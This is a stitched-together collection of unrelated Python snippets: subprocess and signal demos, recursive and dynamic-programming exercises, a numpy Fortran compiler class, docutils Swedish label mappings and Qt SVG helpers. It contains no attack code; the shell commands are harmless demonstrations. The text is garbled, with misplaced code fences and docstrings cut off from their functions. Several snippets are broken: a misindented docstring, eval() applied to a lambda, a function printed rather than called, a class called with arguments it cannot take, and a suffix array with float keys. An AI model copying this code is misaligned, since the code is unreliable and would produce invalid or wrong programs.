    'cat -; echo "to stderr" 1>&2',
    shell=True,
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
msg = 'through stdin to stdout'.encode('utf-8')
stdout_value, stderr_value = proc.communicate(msg)
print('pass through:', repr(stdout_value.decode('utf-8')))
print('stderr      :', repr(stderr_value.decode('utf-8')))

```









---


```py



#end_pymotw_header
import subprocess

print('popen4:')
proc = subprocess.Popen(
    'cat -; echo "to stderr" 1>&2',
    shell=True,
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
)
msg = 'through stdin to stdout\n'.encode('utf-8')
stdout_value, stderr_value = proc.communicate(msg)
print('combined output:', repr(stdout_value.decode('utf-8')))
print('stderr value   :', repr(stderr_value))

```









---


```py



#end_pymotw_header
import subprocess

print('read:')
proc = subprocess.Popen(
    ['echo', '"to stdout"'],
    stdout=subprocess.PIPE,
)
stdout_value = proc.communicate()[0].decode('utf-8')
print('stdout:', repr(stdout_value))

```









---


```py



#end_pymotw_header
import subprocess

print('write:')
proc = subprocess.Popen(
    ['cat', '-'],
    stdin=subprocess.PIPE,
)
proc.communicate('stdin: to stdin\n'.encode('utf-8'))

#!/usr/bin/env python3
#
# Copyright 2010 Doug Hellmann.
#```


```pyChecking exit codes from external processes```


```py

#end_pymotw_header
import subprocess

try:
    subprocess.run(['false'], check=True)
except subprocess.CalledProcessError as err:
    print('ERROR:', err)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```py
Capture the output of a command and test its
exit code at the same time.```


```py

#end_pymotw_header
import subprocess

completed = subprocess.run(
    ['ls', '-1'],
    stdout=subprocess.PIPE,
)
print('returncode:', completed.returncode)
print('Have {} bytes in stdout:\n{}'.format(
    len(completed.stdout),
    completed.stdout.decode('utf-8'))
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```py
Capture the output of a command and
test its exit code at the same time.```


```py

#end_pymotw_header
import subprocess

try:
    completed = subprocess.run(
        'echo to stdout; echo to stderr 1>&2; exit 1',
        check=True,
        shell=True,
        stdout=subprocess.PIPE,
    )
except subprocess.CalledProcessError as err:
    print('ERROR:', err)
else:
    print('returncode:', completed.returncode)
    print('Have {} bytes in stdout: {!r}'.format(
        len(completed.stdout),
        completed.stdout.decode('utf-8'))
    )

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```py
Capture the output of a command and
test its exit code at the same time.```


```py

#end_pymotw_header
import subprocess

try:
    completed = subprocess.run(
        'echo to stdout; echo to stderr 1>&2; exit 1',
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
except subprocess.CalledProcessError as err:
    print('ERROR:', err)
else:
    print('returncode:', completed.returncode)
    print('stdout is {!r}'.format(completed.stdout))
    print('stderr is {!r}'.format(completed.stderr))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```py
Capture the output of a command and
test its exit code at the same time.```


```py

#end_pymotw_header
import subprocess

try:
    completed = subprocess.run(
        'echo to stdout; echo to stderr 1>&2; exit 1',
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
except subprocess.CalledProcessError as err:
    print('ERROR:', err)
else:
    print('returncode:', completed.returncode)
    print('Have {} bytes in stdout: {!r}'.format(
        len(completed.stdout),
        completed.stdout.decode('utf-8'))
    )
    print('Have {} bytes in stderr: {!r}'.format(
        len(completed.stderr),
        completed.stderr.decode('utf-8'))
    )

```









---


```py


#end_pymotw_header
import subprocess

completed = subprocess.run('echo $HOME', shell=True)
print('returncode:', completed.returncode)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import os
import signal
import subprocess
import tempfile
import time
import sys

script = '''#!/bin/sh
echo "Shell script in process $$"
set -x
python3 signal_child.py
'''
script_file = tempfile.NamedTemporaryFile('wt')
script_file.write(script)
script_file.flush()

proc = subprocess.Popen(['sh', script_file.name])
print('PARENT      : Pausing before signaling {}...'.format(
    proc.pid))
sys.stdout.flush()
time.sleep(1)
print('PARENT      : Signaling child {}'.format(proc.pid))
sys.stdout.flush()
os.kill(proc.pid, signal.SIGUSR1)
time.sleep(3)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import os
import signal
import subprocess
import tempfile
import time
import sys


def show_setting_prgrp():
    print('Calling os.setpgrp() from {}'.format(os.getpid()))
    os.setpgrp()
    print('Process group is now {}'.format(os.getpgrp()))
    sys.stdout.flush()


script = '''#!/bin/sh
echo "Shell script in process $$"
set -x
python3 signal_child.py
'''
script_file = tempfile.NamedTemporaryFile('wt')
script_file.write(script)
script_file.flush()

proc = subprocess.Popen(
    ['sh', script_file.name],
    preexec_fn=show_setting_prgrp,
)
print('PARENT      : Pausing before signaling {}...'.format(
    proc.pid))
sys.stdout.flush()
time.sleep(1)
print('PARENT      : Signaling process group {}'.format(
    proc.pid))
sys.stdout.flush()
os.killpg(proc.pid, signal.SIGUSR1)
time.sleep(3)

# Print all subset combinations of n element in given set of r element.


def combination_util(arr, n, r, index, data, i):
    """
    Current combination is ready to be printed, print it
    arr[]  ---> Input Array
    data[] ---> Temporary array to store current combination
    start & end ---> Staring and Ending indexes in arr[]
    index  ---> Current index in data[]
    r ---> Size of a combination to be printed
    """
    if index == r:
        for j in range(r):
            print(data[j], end=" ")
        print(" ")
        return
    #  When no more elements are there to put in data[]
    if i >= n:
        return
    # current is included, put next at next location
    data[index] = arr[i]
    combination_util(arr, n, r, index + 1, data, i + 1)
    # current is excluded, replace it with
    # next (Note that i+1 is passed, but
    # index is not changed)
    combination_util(arr, n, r, index, data, i + 1)
    # The main function that prints all combinations
    # of size r in arr[] of size n. This function
    # mainly uses combinationUtil()


def print_combination(arr, n, r):
    # A temporary array to store all combination one by one
    data = [0] * r
    # Print all combination using temporary array 'data[]'
    combination_util(arr, n, r, 0, data, 0)


# Driver function to check for above function
arr = [10, 20, 30, 40, 50]
print_combination(arr, len(arr), 3)
# This code is contributed by Ambuj sahu
````

```py
Aim: From a list of integers, check and return a set of integers whose sum
     will be equal to the target value K.
```

```py

# Main Recursive function to find the desired Subset Sum
def Subset_Sum(li, target, ans=[]):

    # Base Cases
    if target == 0 and ans != []:
        return ans

    elif li == []:
        return False

    # li[0] is not included in the answer Subset
    temp = Subset_Sum(li[1:], target, ans)
    if temp:
        return temp

    # li[0] included in the answer Subset
    temp = Subset_Sum(li[1:], target - li[0], ans + [li[0]])

    return temp


# --------------------------- DRIVER CODE------------------------------

if __name__ == "__main__":

    li = [int(i) for i in input("Enter the List of Integers: ").split()]
    Target = int(input("Enter the Target value: "))

    ans = Subset_Sum(li, Target)
    if not ans:
        print("No Subset Sum matched to the Target")
    else:
        print("The Required Subset is : ", *ans)
```

````py
Sample Input:
Enter the List of Integers: -1 2 6 7 -4 7 5 -2
Enter the Target value: 0

Sample Output:
The Required Subset is :  6 -4 -2

Explanation:
6 - 4 - 2 = 0, the required result

COMPLEXITY:

     Time Complexity: O(2^N)
     Space complexity: O(N)
     ```


```py

# Recursive Python3 program to find if a given pattern is
# present in a text


def exactMatch(text, pat, text_index, pat_index):
    if text_index == len(text) and pat_index != len(pat):
        return 0

    # Else If last character of pattern reaches
    if pat_index == len(pat):
        return 1

    if text[text_index] == pat[pat_index]:
        return exactMatch(text, pat, text_index + 1, pat_index + 1)

    return 0


# This function returns true if 'text' contain 'pat'
def contains(text, pat, text_index, pat_index):
    # If last character of text reaches
    if text_index == len(text):
        return 0

    # If current characters of pat and text match
    if text[text_index] == pat[pat_index]:
        if exactMatch(text, pat, text_index, pat_index):
            return 1
        else:
            return contains(text, pat, text_index + 1, pat_index)

        # If current characters of pat and tex don't match
    return contains(text, pat, text_index + 1, pat_index)


# Driver program to test the above function

print(contains("geeksforgeeks", "geeks", 0, 0))
print(contains("geeksforgeeks", "geeksquiz", 0, 0))
print(contains("geeksquizgeeks", "quiz", 0, 0))

def sudoku(grid):
 """
 Return boolean indicating if Sudoku is valid.
 """
    seen = set()
    # Iterate through grid
    for i in range(len(grid)):
        for j in range(len(grid[i])):
            current_value = grid[i][j]
            if current_value != '.':
                if (str(current_value) + ' found in row ' + str(i)) in seen or (str(current_value) + ' found in column ' + str(j)) in seen or (str(current_value) + ' found in subgrid ' + str(i//3) + '-' + str(j//3)) in seen:
                    return False
                seen.add(str(current_value) + ' found in row ' + str(i))
                seen.add(str(current_value) + ' found in column ' + str(j))
                seen.add(str(current_value) + ' found in subgrid ' + str(i//3) + '-' + str(j//3))
    return True

def sudoku2(grid):
    # test row
    tab = [[False for col in range(9)] for row in range(9)]

    cols = [[False for col in range(9)] for row in range(9)]
    rows = [[False for col in range(9)] for row in range(9)]
    for r in range(9):
        for c in range(9):
            if grid[r][c] == ".":
                continue
            v = int(grid[r][c]) - 1
            if rows[r][v]:
                return False
            else:
                rows[r][v] = 1

            if cols[c][v]:
                return False
            else:
                cols[c][v] = 1

            a = ((r // 3) * 3) + (c // 3)

            if tab[a][v]:
                return False
            else:
                tab[a][v] = 1

    return True

class Suffix(object):
    def __init__(self):
        self.index = 0
        self.first_rank = -1
        self.adjacent_rank = -1

    def __lt__(self, other):
        if self.first_rank == other.first_rank:
            return self.adjacent_rank < other.adjacent_rank
        return self.first_rank < other.first_rank


class SuffixArray(object):
    def __init__(self, s):
        self.s = s
        self.suffix_array = []

    def print_suffix(self):
        for index in range(len(self.s)):
            ele = self.suffix_array[index]
            print(
                "Suffix index {}, Suffix string {}".format(
                    ele.index, self.s[ele.index :]
                )
            )

    def create_suffix_array(self):
        N = len(self.s)

        for index, char in enumerate(self.s):
            suffix_obj = Suffix()
            suffix_obj.index = index
            suffix_obj.first_rank = ord(char) - ord("a")
            suffix_obj.adjacent_rank = (
                ord(self.s[index + 1]) - ord("a") if (index + 1 < N) else -1
            )
            self.suffix_array.append(suffix_obj)

        self.suffix_array.sort()

        no_char = 4
        index_map = {}
        while no_char < 2 * N:
            rank = 0
            prev_rank, self.suffix_array[0].first_rank = (
                self.suffix_array[0].first_rank,
                rank,
            )
            index_map[self.suffix_array[0].index] = 0

            for index in range(1, N):
                if (
                    self.suffix_array[index].first_rank == prev_rank
                    and self.suffix_array[index].adjacent_rank
                    == self.suffix_array[index - 1].adjacent_rank
                ):
                    self.suffix_array[index].first_rank = rank
                else:
                    rank += 1
                    prev_rank, self.suffix_array[index].first_rank = (
                        self.suffix_array[index].first_rank,
                        rank,
                    )
                index_map[self.suffix_array[index].index] = index

            for index in range(N):
                adjacent_index = self.suffix_array[index].index + (no_char / 2)
                self.suffix_array[index].adjacent_rank = (
                    self.suffix_array[index_map[adjacent_index]]
                    if adjacent_index < N
                    else -1
                )

            self.suffix_array.sort()
            no_char *= 2


if __name__ == "__main__":
    suffix_array = SuffixArray("banana")
    suffix_array.create_suffix_array()
    suffix_array.print_suffix()

def sum_arr(n):
    res = 0
    for x in n:
        res += x
    return res


nums = [52345, 746587, 98589, 54398, 9348, 45887, 49856]
test = sum_arr(nums)

# sum() is Pythons built in method of adding all the elements in a list
if test == sum(nums):
    print("Sum of arr: {}".format(test))
else:
    print("Func dosen't work!")

# [Running] python -u "c:\0-a-A-October\00-weeks\08-my-website\Stable\Public\2-content\Data-Structures\DS-and-Algorithms-Prac\In-Progress\python\sum-arr-dir\sum-arr.py"
# Sum of arr: 1057010

def isSum(value):
    s = 0
    for i in range(100):
        s += i
        if s == value:
            return True

# average of sum of lists
m = [1, 43, 656, 8, 54, 908, 4, 5, 23, 78, 435, 89, 45, 476, 89]
n = [234, 56, 90, 675, 56, 786, 90, 564, 8, 657, 87, 64, 354, 2, 75]
q = [34, 76, 76, 564, 34, 32, 16, 67, 25, 98, 90, 345, 235, 64, 134, 76]


def avgSums():
    summingUp = sum(m) + sum(n) + sum(q)
    summed = summingUp / 3
    return summed


print(avgSums)

# def sumOfTheAngles(n):
#    return (n - 2) * 180

sumOfTheAngles = lambda n: (n - 2) * 180

# n = eval(dir()[0])
# return (n - 2) * 180

# You are given the root node of a binary search tree (BST).

# You need to write a function that returns the sum of values of all the nodes with a value between lower and upper (inclusive).

# The BST is guaranteed to have unique values.

#
# Binary trees are already defined with this interface:
# class Tree(object):
#   def __init__(self, x):
#     self.value = x
#     self.left = None
#     self.right = None


def csBSTRangeSum(root, lower, upper):
    sum = 0

    # value = None
    if root is None:
        return 0
    if (
        root.left is None
        and root.right is None
        and root.value in range(lower, upper + 1)
    ):
        return root.value

    if root is not None and root.value in range(lower, upper + 1):
        value = root.value
        sum += value

    if root.left is not None:
        value = csBSTRangeSum(root.left, lower, upper)
        sum += value
    if root.right is not None:
        value = csBSTRangeSum(root.right, lower, upper)
        sum += value

    return sum

# def sumUpDigits(s):
#    return sum(int(i) for i in s if i.isdigit())

eval(lambda s: sum(int(i) for i in s if i.isdigit()))

def sum_arr(n):
    res = 0
    for x in n:
        res += x
    return res


nums = [52345, 746587, 98589, 54398, 9348, 45887, 49856]
test = sum_arr(nums)

# sum() is Pythons built in method of adding all the elements in a list
if test == sum(nums):
    print("Sum of arr: {}".format(test))
else:
    print("Func dosen't work!")
# Most simple algorithm ever! Isn't it!
````

````py
Sum of non-adjacent numbers

Given a list of integers, write a function that returns the largest sum of non-adjacent numbers.
Numbers can be 0 or negative.

Input: [2, 4, 6, 2, 5]
Output: 13
Output explanation: We pick 2, 6, and 5.

Input: [5, 1, 1, 5]
Output: 10
Output explanation: We pick 5 and 5.

=========================================
Dynamic programming solution, but don't need the whole DP array, only the last 3 sums (DPs) are needed.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def sum_non_adjacent(arr):
    n = len(arr)
    # from the dp matrix you only need the last 3 sums
    sums = [0, 0, 0]

    # TODO: refactor these if-elses, those are to skip using of DP matrix
    if n == 0:
        return 0

    # if negative or zero, the sum will be 0
    sums[0] = max(arr[0], 0)

    if n == 1:
        return sums[0]

    sums[1] = arr[1]
    # if the second number is negative or zero, then jump it
    if sums[1] <= 0:
        sums[1] = sums[0]

    if n == 2:
        return max(sums[0], sums[1])

    sums[2] = arr[2]
    # if the third number is negative or zero, then jump it
    if sums[2] <= 0:
        sums[2] = max(sums[0], sums[1])
    else:
        sums[2] += sums[0]

    # THE SOLUTION
    for i in range(3, n):
        temp = 0

        if arr[i] > 0:
            # take this number, because it's positive and the sum will be bigger
            temp = max(sums[0], sums[1]) + arr[i]
        else:
            # don't take this number, because the sum will be same or smaller
            temp = max(sums)

        # remove the first sum
        sums = sums[1:] + [temp]

    # return the max sum
    return max(sums)


###########
# Testing #
###########

# Test 1
# Correct result => 13
print(sum_non_adjacent([2, 4, 6, 2, 5]))

# Test 2
# Correct result => 15
print(sum_non_adjacent([2, 4, 2, 6, 2, -3, -2, 0, -3, 5]))

# Test 3
# Correct result => 10
print(sum_non_adjacent([5, 1, 1, 5]))

# Test 4
# Correct result => 10
print(sum_non_adjacent([5, 1, -1, 1, 5]))

class ArithmeticSequence:
    def __init__(self, seq):
        self.seq = seq

    def sum(self):
        summed = len(self.seq) / 2 * (self.seq[0] + self.seq[-1])
        return summed


test_sub = [2, 4, 6, 8, 10, 12, 14, 16]
print(ArithmeticSequence(test_sub).sum())
print(sum(test_sub))

# DarkCoder
def sum_of_series(first_term, common_diff, num_of_terms):
    """
    Find the sum of n terms in an arithmetic progression.

    >>> sum_of_series(1, 1, 10)
    55.0
    >>> sum_of_series(1, 10, 100)
    49600.0
    """
    sum = (num_of_terms / 2) * (2 * first_term + (num_of_terms - 1) * common_diff)
    # formula for sum of series
    return sum


def main():
    print(sum_of_series(1, 1, 10))


if __name__ == "__main__":
    import doctest

    doctest.testmod()

def sum_of_geometric_progression(
    first_term: int, common_ratio: int, num_of_terms: int
) -> float:
    """ "
    Return the sum of n terms in a geometric progression.
    >>> sum_of_geometric_progression(1, 2, 10)
    1023.0
    >>> sum_of_geometric_progression(1, 10, 5)
    11111.0
    >>> sum_of_geometric_progression(0, 2, 10)
    0.0
    >>> sum_of_geometric_progression(1, 0, 10)
    1.0
    >>> sum_of_geometric_progression(1, 2, 0)
    -0.0
    >>> sum_of_geometric_progression(-1, 2, 10)
    -1023.0
    >>> sum_of_geometric_progression(1, -2, 10)
    -341.0
    >>> sum_of_geometric_progression(1, 2, -10)
    -0.9990234375
    """
    if common_ratio == 1:
        # Formula for sum if common ratio is 1
        return num_of_terms * first_term

    # Formula for finding sum of n terms of a GeometricProgression
    return (first_term / (1 - common_ratio)) * (1 - common_ratio ** num_of_terms)
````

````py
Multiples of a OR b

If we list all the natural numbers below 10 that are multiples of 3 OR 5, we get 3, 5, 6 and 9.
The sum of these multiples is 23.
Find the sum of all the multiples of A or B below N.

=========================================
Don't need iteration to solve this problem, you need to find only how many divisors are there.
Example - 3 + 6 + 9 ... + N = (1 + 2 + 3 + ... N // 3) * 3
Sum(K)*N = 1*N + 2*N + ... + (K-1)*N + K*N
Use sum formula - (N * (N + 1))/2
    Time Complexity:    O(1)
    Space Complexity:   O(1)```


```py

############
# Solution #
############


def sum_of_multiples_below(a, b, total):
    total -= 1
    # sum of dividens of A + sum of dividens of B - sum of common dividens (because they're added twice)
    return (
        sum_of_dividends(total, a)
        + sum_of_dividends(total, b)
        - sum_of_dividends(total, a * b)
    )


def sum_of_dividends(total, divisor):
    n = total // divisor
    return (n * (n + 1) // 2) * divisor


###########
# TESTING #
###########

# Test 1
# Correct result => 23
print(sum_of_multiples_below(3, 5, 10))

# Test 2
# Correct result => 233168
print(sum_of_multiples_below(3, 5, 1000))

def isSumSubset(arr, arrLen, requiredSum):
    """
    >>> isSumSubset([2, 4, 6, 8], 4, 5)
    False
    >>> isSumSubset([2, 4, 6, 8], 4, 14)
    True
    """
    # a subset value says 1 if that subset sum can be formed else 0
    # initially no subsets can be formed hence False/0
    subset = [[False for i in range(requiredSum + 1)] for i in range(arrLen + 1)]

    # for each arr value, a sum of zero(0) can be formed by not taking any element
    # hence True/1
    for i in range(arrLen + 1):
        subset[i][0] = True

    # sum is not zero and set is empty then false
    for i in range(1, requiredSum + 1):
        subset[0][i] = False

    for i in range(1, arrLen + 1):
        for j in range(1, requiredSum + 1):
            if arr[i - 1] > j:
                subset[i][j] = subset[i - 1][j]
            if arr[i - 1] <= j:
                subset[i][j] = subset[i - 1][j] or subset[i - 1][j - arr[i - 1]]

    # uncomment to print the subset
    # for i in range(arrLen+1):
    #     print(subset[i])
    print(subset[arrLen][requiredSum])


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
        The sum-of-subsetsproblem states that a set of non-negative integers, and a
        value M, determine all possible subsets of the given set whose summation sum
        equal to given M.

        Summation of the chosen numbers must be equal to given number M and one number
        can be used only once.```


```py
from typing import List


def generate_sum_of_subsets_soln(nums: List[int], max_sum: int) -> List[List[int]]:
    result: List[List[int]] = []
    path: List[int] = []
    num_index = 0
    remaining_nums_sum = sum(nums)
    create_state_space_tree(nums, max_sum, num_index, path, result, remaining_nums_sum)
    return result


def create_state_space_tree(
    nums: List[int],
    max_sum: int,
    num_index: int,
    path: List[int],
    result: List[List[int]],
    remaining_nums_sum: int,
) -> None:
    """
    Creates a state space tree to iterate through each branch using DFS.
    It terminates the branching of a node when any of the two conditions
    given below satisfy.
    This algorithm follows depth-fist-search and backtracks when the node is not
    branchable.

    """
    if sum(path) > max_sum or (remaining_nums_sum + sum(path)) < max_sum:
        return
    if sum(path) == max_sum:
        result.append(path)
        return
    for num_index in range(num_index, len(nums)):
        create_state_space_tree(
            nums,
            max_sum,
            num_index + 1,
            path + [nums[num_index]],
            result,
            remaining_nums_sum - nums[num_index],
        )

````

```py
remove the comment to take an input from the user

print("Enter the elements")
nums = list(map(int, input().split()))
print("Enter max_sum sum")
max_sum = int(input())
```

```py
nums = [3, 34, 4, 12, 5, 2]
max_sum = 9
result = generate_sum_of_subsets_soln(nums, max_sum)
print(*result)

def sumUpNumbers(inputString):
 """
 Return the sum of the numbers in the inputString

 Time Complexity: O(n)
 Space Complexity: O(1)
 """
    runningsum, number = 0, ''
    for i in range(len(inputString)):
        if inputString[i].isdigit():
            number += inputString[i]
            if i == len(inputString) - 1:
                runningsum += int(number)
                number = ''
        elif number != '' and not inputString[i].isdigit():
            runningsum += int(number)
            number = ''
    return runningsum
import os

# simpler version


def sum_nums(file):
    # using the with keyword
    # this enables automatic closing of data
    # after it has read all the content of the file
    # assuming your script and the passed file is in the
    # same directory, we don't have to use os module
    # os stands for operating system
    with open(file, "r") as data:
        # split your one-row file
        nums = []
        for line in data:
            nums.extend(line.split(" "))

        summ = 0

        for num in nums:
            summ += int(num)

        return summ


def sum_nums(file):
    with open(os.path.join(os.getcwd(), file), "r") as data:
        # store numbers here
        stack = []

        # iterate every line in file
        for line in data:
            # split data every line using white space (" ")
            stack.append(line.split(" "))

        # convert each list of nums to int
        stack_int = []
        for l in stack:
            stack_int.append([int(num) for num in l])

        # compute sum for each line
        sums = []
        for nums in stack_int:
            sums.append(sum(nums))

        return sums


fn = "numbers.txt"

print(sum_nums(fn))

# python tutor
import pprint

# codewards problem
# link here https://www.codewars.com/kata/55aa075506463dac6600010d/python


class Divisors:
    def square_divisor(self, n: int) -> list:
        """Return a list of perfect sum of squares of divisors.
            None if the sum of squares are not perfect square
        """

        import math

        divisors = []
        for i in range(1, n + 1):
            if n % i == 0:
                divisors.append(i)

        #  Get the square of each divisor
        #  and compute the sum
        sum_square_div = sum([num ** 2 for num in divisors])
        sr = math.sqrt(sum_square_div)

        ans = []
        #  Test for perfect square
        if sr - math.floor(sr) == 0:
            ans.append(sum_square_div)
            return [n, ans[0]]

        else:
            return None

    def find_perfect_square_div(self, nums: list) -> list:
        """Return a list of perfect square divisors"""
        n, m = nums

        ans = []

        for i in range(n, m + 1):
            if self.square_divisor(i):
                ans.append(self.square_divisor(i))

        return ans


a = Divisors()
# test for square_divisor
print(a.square_divisor(42))

# test for find_perfect_square_div
test0 = [1, 1000]
a = Divisors()
pprint.pprint(a.find_perfect_square_div((test0)))

from numpy.distutils.ccompiler import simple_version_match
from numpy.distutils.fcompiler import FCompiler

compilers = ['SunFCompiler']

class SunFCompiler(FCompiler):

    compiler_type = 'sun'
    description = 'Sun or Forte Fortran 95 Compiler'
    # ex:
    # f90: Sun WorkShop 6 update 2 Fortran 95 6.2 Patch 111690-10 2003/08/28
    version_match = simple_version_match(
                      start=r'f9[05]: (Sun|Forte|WorkShop).*Fortran 95')

    executables = {
        'version_cmd'  : ["<F90>", "-V"],
        'compiler_f77' : ["f90"],
        'compiler_fix' : ["f90", "-fixed"],
        'compiler_f90' : ["f90"],
        'linker_so'    : ["<F90>", "-Bdynamic", "-G"],
        'archiver'     : ["ar", "-cr"],
        'ranlib'       : ["ranlib"]
        }
    module_dir_switch = '-moddir='
    module_include_switch = '-M'
    pic_flags = ['-xcode=pic32']

    def get_flags_f77(self):
        ret = ["-ftrap=%none"]
        if (self.get_version() or '') >= '7':
            ret.append("-f77")
        else:
            ret.append("-fixed")
        return ret
    def get_opt(self):
        return ['-fast', '-dalign']
    def get_arch(self):
        return ['-xtarget=generic']
    def get_libraries(self):
        opt = []
        opt.extend(['fsu', 'sunmath', 'mvec'])
        return opt

    def runtime_library_dir_option(self, dir):
        return '-R%s' % dir

if __name__ == '__main__':
    from distutils import log
    log.set_verbosity(2)
    from numpy.distutils import customized_fcompiler
    print(customized_fcompiler(compiler='sun').get_version())

# def twoSum(arr,n,target):
#     for i in range(n):
#         for j in range(1,n):
#             result=arr[i]+arr[j]
#             if result==target:
#                 print("["+str(i)+","+str(j)+"]")


# arr=[2,7,11,15]

# twoSum(arr,len(arr),9)


class Solution:
    # def __init__(self,arr,n,target):
    #     self.arr=arr
    #     self.n=n
    #     self.target=target
    def twoSum(self, arr, n, target):
        for i in range(self.n):
            for j in range(1, self.n):
                result = self.arr[i] + self.arr[j]
                if result == self.target:
                    print("[" + str(i) + "," + str(j) + "]")


temp = Solution([2, 7, 11, 15], len([2, 7, 11, 15]), 9)

temp.twoSum()

def checkBlanagrams(word1, word2):
    lenWord1 = len(word1)
    lenWord2 = len(word2)
    freq1 = [0] * 26
    freq2 = [0] * 26
    count = 0
    for i in range(lenWord1):
        freq1[ord(word1[i]) - ord("a")] += 1
    for i in range(lenWord2):
        freq2[ord(word2[i]) - ord("a")] += 1
    for i in range(26):
        count += min(freq1[i], freq2[i])
    return count == lenWord1 - 1 == lenWord2 - 1


if __name__ == "__main__":
    print(checkBlanagrams("tangram", "anagram"))

from sklearn import svm
from sklearn.datasets import load_iris
from sklearn.model_selection import train_test_split


# different functions implementing different types of SVM's
def NuSVC(train_x, train_y):
    svc_NuSVC = svm.NuSVC()
    svc_NuSVC.fit(train_x, train_y)
    return svc_NuSVC


def Linearsvc(train_x, train_y):
    svc_linear = svm.LinearSVC(tol=10e-2)
    svc_linear.fit(train_x, train_y)
    return svc_linear


def SVC(train_x, train_y):
    # svm.SVC(C=1.0, kernel='rbf', degree=3, gamma=0.0, coef0=0.0, shrinking=True,
    # probability=False,tol=0.001, cache_size=200, class_weight=None, verbose=False,
    # max_iter=1000, random_state=None)
    # various parameters like "kernel","gamma","C" can effectively tuned for a given
    # machine learning model.
    SVC = svm.SVC(gamma="auto")
    SVC.fit(train_x, train_y)
    return SVC


def test(X_new):
    """
    3 test cases to be passed
    an array containing the sepal length (cm), sepal width (cm), petal length (cm),
    petal width (cm) based on which  the target name will be predicted
    >>> test([1,2,1,4])
    'virginica'
    >>> test([5, 2, 4, 1])
    'versicolor'
    >>> test([6,3,4,1])
    'versicolor'
    """
    iris = load_iris()
    # splitting the dataset to test and train
    train_x, test_x, train_y, test_y = train_test_split(
        iris["data"], iris["target"], random_state=4
    )
    # any of the 3 types of SVM can be used
    # current_model=SVC(train_x, train_y)
    # current_model=NuSVC(train_x, train_y)
    current_model = Linearsvc(train_x, train_y)
    prediction = current_model.predict([X_new])
    return iris["target_names"][prediction][0]


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# -*- coding: utf-8 -*-
# $Id: sv.py 8006 2016-12-22 23:02:44Z milde $
# Author: Adam Chodorowski <chodorowski@users.sourceforge.net>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
```

````py
Swedish language mappings for language-dependent features of Docutils.```


```py

__docformat__ = 'reStructuredText'

labels = {
    'author':       u'Författare',
    'authors':      u'Författare',
    'organization': u'Organisation',
    'address':      u'Adress',
    'contact':      u'Kontakt',
    'version':      u'Version',
    'revision':     u'Revision',
    'status':       u'Status',
    'date':         u'Datum',
    'copyright':    u'Copyright',
    'dedication':   u'Dedikation',
    'abstract':     u'Sammanfattning',
    'attention':    u'Observera!',
    'caution':      u'Akta!', # 'Varning' already used for 'warning'
    'danger':       u'FARA!',
    'error':        u'Fel',
    'hint':         u'Vink',
    'important':    u'Viktigt',
    'note':         u'Notera',
    'tip':          u'Tips',
    'warning':      u'Varning',
    'contents':     u'Innehåll' }```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    # 'Author' and 'Authors' identical in Swedish; assume the plural:
    u'författare': 'authors',
    u' n/a':            'author',
    u'organisation':    'organization',
    u'adress':          'address',
    u'kontakt':         'contact',
    u'version':         'version',
    u'revision':        'revision',
    u'status':          'status',
    u'datum':           'date',
    u'copyright':       'copyright',
    u'dedikation':      'dedication',
    u'sammanfattning':  'abstract' }```


```pySwedish (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [';', ',']```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""
````

`py Defines utility functions for working with SVG documents in Qt.`

```py

# System library imports.
from qtpy import QtCore, QtGui, QtSvg, QtWidgets


def save_svg(string, parent=None):
    """ Prompts the user to save an SVG document to disk.

    Parameters
    ----------
    string : basestring
        A Python string containing a SVG document.

    parent : QWidget, optional
        The parent to use for the file dialog.

    Returns
    -------
    The name of the file to which the document was saved, or None if the save
    was cancelled.
    """
    if isinstance(string, str):
        string = string.encode('utf-8')

    dialog = QtWidgets.QFileDialog(parent, 'Save SVG Document')
    dialog.setAcceptMode(QtWidgets.QFileDialog.AcceptSave)
    dialog.setDefaultSuffix('svg')
    dialog.setNameFilter('SVG document (*.svg)')
    if dialog.exec_():
        filename = dialog.selectedFiles()[0]
        f = open(filename, 'wb')
        try:
            f.write(string)
        finally:
            f.close()
        return filename
    return None

def svg_to_clipboard(string):
    """ Copy a SVG document to the clipboard.

    Parameters
    ----------
    string : basestring
        A Python string containing a SVG document.
    """
    if isinstance(string, str):
        string = string.encode('utf-8')

    mime_data = QtCore.QMimeData()
    mime_data.setData('image/svg+xml', string)
    QtWidgets.QApplication.clipboard().setMimeData(mime_data)

def svg_to_image(string, size=None):
    """ Convert a SVG document to a QImage.

    Parameters
    ----------
    string : basestring
        A Python string containing a SVG document.

    size : QSize, optional
        The size of the image that is produced. If not specified, the SVG
        document's default size is used.

    Raises
    ------
    ValueError
        If an invalid SVG string is provided.

    Returns
    -------
    A QImage of format QImage.Format_ARGB32.
    """
    if isinstance(string, str):
        string = string.encode('utf-8')

    renderer = QtSvg.QSvgRenderer(QtCore.QByteArray(string))
    if not renderer.isValid():
        raise ValueError('Invalid SVG data.')

    if size is None:
        size = renderer.defaultSize()
    image = QtGui.QImage(size, QtGui.QImage.Format_ARGB32)
    image.fill(0)
    painter = QtGui.QPainter(image)
    renderer.render(painter)
    return image

def swap_case(s):
    swapped = ""
    for i in range(len(s)):
        temp = s[i].upper()
        if s[i] == temp:
            swapped += s[i].lower()
        else:
            swapped += s[i].upper()

    return swapped
```

````py
Swap the frst and the last word

Given an string, you need to swap the first and last word in linear time.
Everything between should stay in same order.

Sample input: 'i like this program very much'
